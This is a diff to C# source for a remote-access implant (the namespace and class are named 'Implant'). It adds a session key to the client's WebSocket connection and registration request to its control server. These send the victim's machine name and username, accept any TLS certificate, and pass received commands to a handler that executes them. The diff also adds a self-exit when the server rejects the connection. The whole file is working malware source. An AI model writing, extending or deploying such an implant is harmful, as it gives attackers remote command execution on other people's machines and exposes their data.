@@ -37,6 +37,7 @@ namespace Implant
     {
         private string _group;
         private string _base_url;
+        private string _sess_key;
         private string _currentDir;
         private Dictionary<int, byte[]> _chunkSequences = new Dictionary<int, byte[]>();
         private bool _running;
@@ -51,10 +52,11 @@ namespace Implant
         private readonly ConcurrentDictionary<string, string> _uploadDestinations = new ConcurrentDictionary<string, string>();
 
 
-        public Implant( string group = "", string base_url="")
+        public Implant( string group = "", string base_url="", string sess_key="")
         {
             _group = group;
             _base_url = base_url;
+            _sess_key = sess_key;
             _currentDir = Directory.GetCurrentDirectory();
             _running = true;
             _attacks = new List<Attack>();
@@ -85,7 +87,7 @@ namespace Implant
             (sender, certificate, chain, sslPolicyErrors) => true;
 
             _ws = new ClientWebSocket();
-            var uri = new Uri($"ws://{_base_url}?id={_implId}-root={GetRoot()}-user={Environment.UserName}");
+            var uri = new Uri($"ws://{_base_url}?id={_implId}-root={GetRoot()}-user={Environment.UserName}&sess_key={_sess_key}");
 
 
 
@@ -94,12 +96,18 @@ namespace Implant
 
                 await _ws.ConnectAsync(uri, _wsCancellationTokenSource.Token);
 
+
                 while (_running && _ws.State == WebSocketState.Open)
                 {
                     var message = await ReceiveMessage();
                     if (!string.IsNullOrEmpty(message))
                     {
-                        await HandleCommand(message);
+                        if( message.Contains("Invalid conection")){
+                            await CloseWebSocketAsync();
+                            Environment.Exit(0);
+                        }else{
+                            await HandleCommand(message);
+                        }
                     }
                 }
             }
@@ -435,7 +443,7 @@ namespace Implant
             }
             catch (Exception ex)
             {
-                return $"Error ejecutando comando: {ex.Message}";
+                return $"Error executing command: {ex.Message}";
             }
         }
 
@@ -991,7 +999,8 @@ namespace Implant
                     impl_id = $"{_implId}-root={GetRoot()}-user={Environment.UserName}",
                     hostname = Environment.MachineName,
                     root = GetRoot(),
-                    user = Environment.UserName
+                    user = Environment.UserName,
+                    sess_key = _sess_key
                 };
                 System.Net.ServicePointManager.ServerCertificateValidationCallback +=
                 (sender, cert, chain, sslPolicyErrors) => true;
@@ -1005,7 +1014,7 @@ namespace Implant
             }
             catch (Exception ex)
             {
-                Debug.WriteLine($"Error en Register: {ex.Message}");
+                Debug.WriteLine($"Error Register: {ex.Message}");
             }
         }
 
@@ -1186,10 +1195,11 @@ namespace Implant
                 string url = data[1];
                 string port = data[2];
                 string group = data[3];
+                string sess_key = data[4];
 
 
 
-                var implant = new Implant( group, $"{url}:{port}");
+                var implant = new Implant( group, $"{url}:{port}", sess_key);
                 await implant.Run();
 
             }
